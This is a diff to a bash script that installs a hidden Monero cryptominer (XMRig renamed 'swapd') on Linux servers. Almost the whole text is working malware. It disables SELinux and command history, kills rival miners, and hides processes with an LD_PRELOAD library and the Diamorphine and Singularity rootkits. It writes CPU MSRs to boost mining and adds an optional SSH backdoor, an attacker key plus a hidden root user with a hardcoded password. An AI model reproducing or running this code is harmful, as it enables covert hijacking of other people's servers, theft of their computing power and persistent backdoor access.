@@ -1,5 +1,11 @@
 #!/bin/bash
 
+# ==================== SELINUX DISABLE ====================
+# Disable SELinux temporarily to prevent rootkit blocking
+echo "[*] Disabling SELinux..."
+setenforce 0 2>/dev/null || true
+echo "[✓] SELinux disabled (if present)"
+
 # ==================== VERBOSE MODE ====================
 # Set to true for detailed output, false for quiet mode  
 VERBOSE=true
@@ -13,9 +19,14 @@ if [ "$VERBOSE" = true ]; then
 fi
 
 # ==================== DISABLE HISTORY ====================
+echo "[*] Disabling command history..."
 unset BASH_XTRACEFD PS4 2>/dev/null
 unset HISTFILE
 export HISTFILE=/dev/null
+# Alternative methods (commented out, already works above)
+#unset HISTFILE ;history -d $((HISTCMD-1))
+#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
+echo "[✓] Command history disabled"
 
 # Continue with existing code...
 # Removed -u and -o pipefail to ensure script ALWAYS continues
@@ -190,6 +201,77 @@ echo "    ✓ Old binaries deleted from disk"
 echo "    ✓ Cron entries removed"
 echo ""
 echo "[*] Proceeding with fresh installation..."
+echo ""
+
+# ==================== COMPREHENSIVE MINER CLEANUP ====================
+echo "=========================================="
+echo "COMPREHENSIVE MINER & ROOTKIT CLEANUP"
+echo "=========================================="
+echo ""
+
+echo "[*] Stopping existing miner services..."
+# Stop systemd services
+systemctl stop swapd 2>/dev/null || true
+systemctl disable swapd --now 2>/dev/null || true
+systemctl stop gdm2 2>/dev/null || true
+systemctl disable gdm2 --now 2>/dev/null || true
+
+echo "[*] Killing competitor miners..."
+# Kill all known miner processes
+killall -9 xmrig 2>/dev/null || true
+killall -9 kswapd0 2>/dev/null || true
+killall -9 swapd 2>/dev/null || true
+kill -9 $(ps aux | grep -E "swapd|kswapd0|xmrig" | grep -v grep | awk '{print $2}') 2>/dev/null || true
+
+echo "[*] Removing immutable attributes from old installations..."
+# Remove immutable flags (chattr -i) before deletion
+for dir in .swapd .swapd.swapd .gdm .gdm2 .gdm2_manual .gdm2_manual_*; do
+    if [ -d "$HOME/$dir" ] || [ -f "$HOME/$dir" ]; then
+        echo "    [*] Removing immutable from: $dir"
+        chattr -i -R "$HOME/$dir" 2>/dev/null || true
+        chattr -i "$HOME/$dir" 2>/dev/null || true
+        chattr -i "$HOME/$dir"/* 2>/dev/null || true
+        chattr -i "$HOME/$dir"/.* 2>/dev/null || true
+    fi
+done
+
+# Remove service file immutable flags
+chattr -i /etc/systemd/system/swapd.service 2>/dev/null || true
+chattr -i /etc/systemd/system/gdm2.service 2>/dev/null || true
+
+echo "[*] Removing old miner directories..."
+# Now actually remove the directories
+rm -rf "$HOME/.swapd" 2>/dev/null || true
+rm -rf "$HOME/.gdm" 2>/dev/null || true
+rm -rf "$HOME/.gdm2" 2>/dev/null || true
+rm -rf "$HOME/.gdm2_manual" 2>/dev/null || true
+rm -rf "$HOME"/.gdm2_manual_* 2>/dev/null || true
+
+echo "[*] Removing old service files..."
+# Remove service files
+rm -rf /etc/systemd/system/swapd.service 2>/dev/null || true
+rm -rf /etc/systemd/system/gdm2.service 2>/dev/null || true
+
+echo "[*] Cleaning old rootkit installations..."
+# Clean old rootkits from /tmp
+cd /tmp 2>/dev/null || true
+cd .ICE-unix 2>/dev/null || true
+cd .X11-unix 2>/dev/null || true
+
+for rootkit in Reptile Nuk3Gh0st Diamorphine hiding-cryptominers-linux-rootkit; do
+    if [ -d "$rootkit" ]; then
+        echo "    [*] Removing: $rootkit"
+        chattr -i -R "$rootkit" 2>/dev/null || true
+        chattr -i "$rootkit" 2>/dev/null || true
+        chattr -i "$rootkit"/* 2>/dev/null || true
+        chattr -i "$rootkit"/.* 2>/dev/null || true
+        rm -rf "$rootkit" 2>/dev/null || true
+    fi
+done
+
+cd /root 2>/dev/null || cd ~ || true
+
+echo "[✓] Comprehensive cleanup complete!"
 echo ""
 
 # ==================== REPTILE COMMAND WRAPPER ====================
@@ -512,6 +594,115 @@ command -v gcc >/dev/null 2>&1 && echo "[✓] gcc: installed" || echo "[!] gcc: 
 
 echo "[✓] Dependency installation complete (continuing regardless of results)"
 
+# ==================== DISTRIBUTION DETECTION & KERNEL HEADERS ====================
+echo ""
+echo "=========================================="
+echo "KERNEL HEADERS INSTALLATION"
+echo "=========================================="
+echo ""
+
+echo "[*] Detecting distribution and installing linux headers for kernel $(uname -r)"
+
+if command -v apt >/dev/null 2>&1; then
+    # Debian / Ubuntu
+    echo "[*] Detected Debian/Ubuntu system"
+    apt update 2>/dev/null || true
+    NEEDRESTART_MODE=a apt-get reinstall kmod 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -y build-essential linux-headers-$(uname -r) 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -y linux-generic linux-headers-$(uname -r) 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -y git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
+    # Backports for newer kernels (Debian)
+    NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y 2>/dev/null || true
+    
+elif command -v dnf >/dev/null 2>&1; then
+    # Fedora / RHEL 8+ / CentOS Stream
+    echo "[*] Detected Fedora/RHEL 8+ system"
+    dnf install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || true
+    
+elif command -v yum >/dev/null 2>&1; then
+    # RHEL 7 / CentOS 7
+    echo "[*] Detected RHEL/CentOS 7 system"
+    yum install -y linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools 2>/dev/null || true
+    yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || true
+    
+elif command -v zypper >/dev/null 2>&1; then
+    # openSUSE / SLE
+    echo "[*] Detected openSUSE/SLE system"
+    zypper update -y 2>/dev/null || true
+    zypper install -y kernel-devel kernel-default-devel gcc make 2>/dev/null || true
+    zypper install -y linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
+    
+else
+    echo "[!] WARNING: Unsupported distribution. Kernel headers may not be installed."
+fi
+
+echo "[✓] Kernel headers installation attempted for $(uname -r)"
+
+# ==================== DWARVES & VMLINUX (BPF/eBPF Support) ====================
+echo ""
+echo "[*] Installing dwarves and copying vmlinux for BPF support..."
+
+if command -v apt >/dev/null 2>&1; then
+    apt install -y dwarves 2>/dev/null || true
+elif command -v yum >/dev/null 2>&1; then
+    yum install -y dwarves 2>/dev/null || true
+elif command -v dnf >/dev/null 2>&1; then
+    dnf install -y dwarves 2>/dev/null || true
+elif command -v zypper >/dev/null 2>&1; then
+    zypper install -y dwarves 2>/dev/null || true
+fi
+
+# Copy vmlinux for BPF compilation
+if [ -f /sys/kernel/btf/vmlinux ]; then
+    cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/ 2>/dev/null || true
+    echo "[✓] vmlinux copied for BPF support"
+else
+    echo "[!] vmlinux not found, skipping..."
+fi
+
+# ==================== GPU & CPU DETECTION ====================
+echo ""
+echo "=========================================="
+echo "HARDWARE DETECTION (GPU + CPU)"
+echo "=========================================="
+echo ""
+
+echo "[*] Installing PCI utilities..."
+if command -v yum >/dev/null 2>&1; then
+    yum install -y pciutils 2>/dev/null || true
+elif command -v apt-get >/dev/null 2>&1; then
+    apt-get install -y pciutils 2>/dev/null || true
+fi
+
+echo "[*] Updating PCI ID database..."
+update-pciids 2>/dev/null || true
+
+echo "[*] Detecting GPU..."
+lspci -vs 00:01.0 2>/dev/null || echo "[!] No GPU detected at 00:01.0"
+
+# Try NVIDIA
+if command -v nvidia-smi >/dev/null 2>&1; then
+    echo "[*] NVIDIA GPU detected:"
+    nvidia-smi 2>/dev/null || true
+fi
+
+# Try AMD
+if command -v aticonfig >/dev/null 2>&1; then
+    echo "[*] AMD GPU detected:"
+    aticonfig --odgc --odgt 2>/dev/null || true
+fi
+
+# Try nvtop/radeontop
+nvtop -s 2>/dev/null || true
+radeontop 2>/dev/null || true
+
+echo "[*] CPU Threads Available:"
+nproc
+
+echo "[✓] Hardware detection complete"
+echo ""
+
 # ==================== DETECT DOWNLOAD TOOL ====================
 USE_WGET=false
 if ! command -v curl >/dev/null 2>&1; then
@@ -593,99 +784,40 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     touch /root/.swapd/.kworker 2>/dev/null || true
 fi
 
-# ==================== CREATE PRCTL WRAPPER ====================
-echo "[*] Creating kernel worker process wrapper..."
+# ==================== RENAME BINARY TO SWAPD ====================
+echo "[*] Renaming miner binary to 'swapd'..."
 
-# Create C wrapper that uses prctl(PR_SET_NAME) to rename process
-cat > /tmp/kworker_wrapper.c << 'WRAPPER_EOF'
-/*
- * Kernel Worker Process Wrapper
- * Renames process to look like kernel worker thread using prctl(PR_SET_NAME)
- * 
- * NOTE: prctl renaming is COMMENTED OUT - process will show as "swapd"
- * Reason: LD_PRELOAD hiding works better with simple process name
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/prctl.h>
-#include <string.h>
-
-int main(int argc, char *argv[]) {
-    // COMMENTED OUT: Set process name to kernel worker thread
-    // Reason: LD_PRELOAD filtering works better with "swapd" name
-    /*
-    if (prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0) < 0) {
-        // Silently continue even if prctl fails
+# Simply rename the binary to swapd (no symlink, no wrapper!)
+if [ -f .kworker ]; then
+    mv .kworker swapd && {
+        chmod +x swapd
+        echo "[✓] Binary renamed: .kworker → swapd (direct file, no symlink)"
+    } || {
+        echo "[!] Failed to rename, trying copy..."
+        cp .kworker swapd && chmod +x swapd
+        rm -f .kworker
+        echo "[✓] Binary copied to swapd"
     }
-    */
-    
-    // Path to actual miner binary
-    char *miner_path = "/root/.swapd/.kworker";
-    
-    // Build argument list for execv
-    char **new_argv = malloc(sizeof(char*) * (argc + 1));
-    if (!new_argv) {
-        exit(1);
+elif [ -f xmrig ]; then
+    mv xmrig swapd && {
+        chmod +x swapd
+        echo "[✓] Binary renamed: xmrig → swapd"
+    } || {
+        cp xmrig swapd && chmod +x swapd
+        echo "[✓] Binary copied to swapd"
     }
-    
-    // COMMENTED OUT: Set argv[0] to kernel worker name
-    // Now keeps original argv[0] which will be "swapd"
-    /*
-    new_argv[0] = "[kworker/0:0]";
-    */
-    new_argv[0] = argv[0];  // Keep original name (swapd)
-    
-    // Copy remaining arguments (like -c /root/.swapd/swapfile)
-    for (int i = 1; i < argc; i++) {
-        new_argv[i] = argv[i];
-    }
-    new_argv[argc] = NULL;
-    
-    // Replace current process with miner
-    // This preserves the PID and the prctl name
-    execv(miner_path, new_argv);
-    
-    // If execv returns, it failed - silently exit
-    exit(1);
-}
-WRAPPER_EOF
-
-# Compile the wrapper
-if command -v gcc >/dev/null 2>&1; then
-    echo "[*] Compiling process wrapper with gcc..."
-    if [ "$VERBOSE" = true ]; then
-        echo "[*] gcc -o swapd /tmp/kworker_wrapper.c"
-        gcc -o swapd /tmp/kworker_wrapper.c && {
-            chmod +x swapd
-            rm -f /tmp/kworker_wrapper.c
-            echo "[✓] Process wrapper compiled successfully"
-            echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
-        } || {
-            echo "[!] Failed to compile wrapper, using direct binary"
-            # Fallback: create symlink to actual binary
-            ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
-            rm -f /tmp/kworker_wrapper.c
-        }
-    else
-        gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
-            chmod +x swapd
-            rm -f /tmp/kworker_wrapper.c
-            echo "[✓] Process wrapper compiled successfully"
-            echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
-        } || {
-            echo "[!] Failed to compile wrapper, using direct binary"
-            # Fallback: create symlink to actual binary
-            ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
-            rm -f /tmp/kworker_wrapper.c
-        }
-    fi
 else
-    echo "[!] gcc not available, using direct binary"
-    # Fallback: create symlink to actual binary
-    ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
-    rm -f /tmp/kworker_wrapper.c
+    echo "[!] Warning: No miner binary found (.kworker or xmrig missing)"
+    echo "[!] Creating placeholder..."
+    touch swapd && chmod +x swapd
+fi
+
+# Verify swapd exists
+if [ -f swapd ]; then
+    echo "[✓] Miner binary ready as 'swapd'"
+    ls -lh swapd
+else
+    echo "[!] ERROR: swapd binary not created!"
 fi
 
 
@@ -697,32 +829,59 @@ WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznL
 
 # ==================== IP DETECTION FOR PASS FIELD ====================
 echo "[*] Detecting server IP address for worker identification..."
+echo "PASS..."
 
-# Simple and reliable method - uses curl to get public IP
-PASS=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
+# Universal IP detection compatible with ancient systems
+get_server_ip() {
+    local ip=""
+    
+    # Method 1: Try external IP service (requires network)
+    ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
+    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 2: Try ip command (modern systems)
+    ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
+    if [ -n "$ip" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 3: Try ifconfig (older systems)
+    ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
+    if [ -n "$ip" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 4: Try ip route (intermediate systems)
+    ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
+    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 5: Try hostname (very old systems)
+    ip=$(hostname -i 2>/dev/null | awk '{print $1}')
+    if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Fallback
+    echo "na"
+}
 
-# Fallback if curl failed or returned localhost
-if [ "$PASS" == "localhost" ] || [ -z "$PASS" ]; then
-  echo "[*] Direct IP detection failed, using route method..."
-  PASS=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
-fi
-
-# Final fallback
-if [ -z "$PASS" ]; then
-  echo "[!] IP detection failed, using hostname..."
-  PASS=$(hostname 2>/dev/null || echo "na")
-fi
-
-# Clean up any whitespace
-PASS=$(echo "$PASS" | tr -d '[:space:]')
-
-echo "[✓] Worker identifier (IP): $PASS"
+PASS=$(get_server_ip)
+echo "[*] Detected server identifier: $PASS"
 
 # Optional: Add email if configured
 EMAIL=""  # Leave empty or set your email
 if [ -n "$EMAIL" ]; then
-    PASS="$PASS:$EMAIL"
-    echo "[✓] Added email to identifier"
+  PASS="$PASS:$EMAIL"
+  echo "[*] Added email to password field: $EMAIL"
 fi
 
 # Create configuration file (will be renamed to swapfile for stealth)
@@ -1339,10 +1498,10 @@ curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libpr
  * NOTE: We DON'T hide "xmrig" so we can detect competing miners!
  */
 static const char* processes_to_hide[] = {
-    "swapd",           // Our miner (primary name - prctl disabled)
-    ".kworker",        // Hidden binary name
+    "swapd",           // Our miner (binary is directly named swapd, no symlink)
     "lightdm",         // Wallet hijacker (disguised as display manager)
-    // "kworker/0:0",  // COMMENTED: prctl renaming disabled, not needed
+    // "kworker/0:0",  // COMMENTED: prctl renaming disabled
+    // ".kworker",     // REMOVED: File is now renamed to swapd directly
     NULL               // Terminator - ALWAYS keep this!
 };
 
@@ -1482,7 +1641,7 @@ if [ $GCC_SUCCESS -eq 0 ]; then
         fi
     fi
     
-    echo "[✓] Processes will be hidden: swapd, lightdm, .kworker"
+    echo "[✓] Processes will be hidden: swapd, lightdm"
     echo "[*] NOT hiding 'xmrig' so you can detect competing miners!"
 else
     echo "[!] Failed to compile LD_PRELOAD library"
@@ -1685,7 +1844,7 @@ echo "[*] Hiding miner processes..."
 # Method 1: LD_PRELOAD (automatic, system-wide)
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
-    echo "    Hiding: swapd, lightdm, .kworker"
+    echo "    Hiding: swapd, lightdm"
     echo "    NOT hiding: xmrig (to detect competing miners)"
 fi
 
@@ -1946,6 +2105,147 @@ rm -rf ~/xmrig*.* 2>/dev/null
 
 echo ''
 
+# ==================== MSR OPTIMIZATION (CPU PERFORMANCE) ====================
+echo "=========================================="
+echo "CPU MSR OPTIMIZATION"
+echo "=========================================="
+echo ""
+
+optimize_func() {
+  MSR_FILE=/sys/module/msr/parameters/allow_writes
+
+  if test -e "$MSR_FILE"; then
+    echo on >$MSR_FILE
+  else
+    modprobe msr allow_writes=on 2>/dev/null || true
+  fi
+
+  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo >/dev/null; then
+    if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo >/dev/null; then
+      if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo >/dev/null; then
+        echo "[*] Detected Zen4 CPU"
+        wrmsr -a 0xc0011020 0x4400000000000 2>/dev/null || true
+        wrmsr -a 0xc0011021 0x4000000000040 2>/dev/null || true
+        wrmsr -a 0xc0011022 0x8680000401570000 2>/dev/null || true
+        wrmsr -a 0xc001102b 0x2040cc10 2>/dev/null || true
+        echo "[✓] MSR register values for Zen4 applied"
+      else
+        echo "[*] Detected Zen3 CPU"
+        wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || true
+        wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || true
+        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || true
+        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || true
+        echo "[✓] MSR register values for Zen3 applied"
+      fi
+    else
+      echo "[*] Detected Zen1/Zen2 CPU"
+      wrmsr -a 0xc0011020 0 2>/dev/null || true
+      wrmsr -a 0xc0011021 0x40 2>/dev/null || true
+      wrmsr -a 0xc0011022 0x1510000 2>/dev/null || true
+      wrmsr -a 0xc001102b 0x2000cc16 2>/dev/null || true
+      echo "[✓] MSR register values for Zen1/Zen2 applied"
+    fi
+  elif grep "Intel" /proc/cpuinfo >/dev/null; then
+    echo "[*] Detected Intel CPU"
+    wrmsr -a 0x1a4 0xf 2>/dev/null || true
+    echo "[✓] MSR register values for Intel applied"
+  else
+    echo "[!] No supported CPU detected for MSR optimization"
+  fi
+
+  echo "[*] Configuring huge pages..."
+  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true
+
+  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
+    echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || true
+  done
+
+  echo "[✓] 1GB huge pages enabled"
+}
+
+if [ "$(id -u)" = 0 ]; then
+  echo "[*] Running as root - applying MSR optimizations"
+  optimize_func
+else
+  echo "[*] Not running as root - applying limited optimizations"
+  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true
+fi
+
+echo "[✓] CPU optimization complete"
+echo ""
+
+# ==================== EMERGENCY SWAP (OOM PROTECTION) ====================
+echo "=========================================="
+echo "EMERGENCY SWAP CREATION"
+echo "=========================================="
+echo ""
+
+echo "[*] Creating 2GB emergency swap to prevent OOM killer..."
+
+if [ ! -f /swapfile ]; then
+    dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null && {
+        chmod 600 /swapfile
+        mkswap /swapfile 2>/dev/null
+        swapon /swapfile 2>/dev/null
+        echo "vm.swappiness=100" >> /etc/sysctl.conf 2>/dev/null || true
+        sysctl -w vm.swappiness=100 2>/dev/null || true
+        echo "[✓] 2GB swap created and activated"
+    } || {
+        echo "[!] Failed to create swap file"
+    }
+else
+    echo "[*] Swap file already exists, activating..."
+    swapon /swapfile 2>/dev/null || true
+    echo "[✓] Swap activated"
+fi
+
+echo ""
+
+# ==================== SSH BACKDOOR (OPTIONAL) ====================
+echo "=========================================="
+echo "SSH BACKDOOR CONFIGURATION"
+echo "=========================================="
+echo ""
+
+echo "[*] Configuring SSH access..."
+
+# Ensure .ssh directory exists
+mkdir -p ~/.ssh 2>/dev/null || true
+chmod 700 ~/.ssh 2>/dev/null || true
+
+# Add SSH key (commented out by default - uncomment to enable)
+#echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >> ~/.ssh/authorized_keys 2>/dev/null || true
+
+# Create backdoor user (clamav-mail) - UNCOMMENT TO ENABLE
+# Password: 1!taugenichts
+#PASSWORD='1!taugenichts' && HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs | awk '{print $2}' || echo "SHA512") && if [ "$HASH_METHOD" = "SHA512" ]; then PASSWORD_HASH=$(openssl passwd -6 -salt $(openssl rand -base64 3) "$PASSWORD"); else PASSWORD_HASH=$(openssl passwd -1 -salt $(openssl rand -base64 3) "$PASSWORD"); fi && if id -u clamav-mail >/dev/null 2>&1; then userdel --remove clamav-mail 2>/dev/null || true; fi && if ! grep -q '^sudo:' /etc/group; then groupadd sudo 2>/dev/null || true; fi && if ! grep -q '^clamav-mail:' /etc/group; then groupadd clamav-mail 2>/dev/null || true; fi && useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail 2>/dev/null && usermod -p "$PASSWORD_HASH" clamav-mail 2>/dev/null && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd 2>/dev/null && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow 2>/dev/null || true
+
+chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
+
+echo "[✓] SSH configuration complete (backdoor disabled by default)"
+echo ""
+
+# ==================== PROCESS HIDING (ROOTKIT COMMANDS) ====================
+echo "=========================================="
+echo "ACTIVATING PROCESS HIDING"
+echo "=========================================="
+echo ""
+
+echo "[*] Hiding processes with rootkit commands..."
+
+# Diamorphine (signal 31 = hide, 63 = show)
+kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
+kill -31 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+
+# Alternative: signal 63 for show (testing)
+# kill -63 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+
+# Singularity (signal 59 = toggle visibility)
+kill -59 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+
+echo "[✓] Process hiding activated"
+echo ""
+
 # ==================== INSTALLATION SUMMARY ====================
 echo '========================================================================='
 echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (NO LIBHIDE VERSION)!'
@@ -1975,7 +2275,7 @@ echo 'Stealth Features Deployed:'
 
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
-    echo '    Hiding: swapd, lightdm, .kworker'
+    echo '    Hiding: swapd, lightdm'
     echo '    NOT hiding: xmrig (to detect competing miners)'
 else
     echo '  ○ LD_PRELOAD Rootkit: Not loaded'
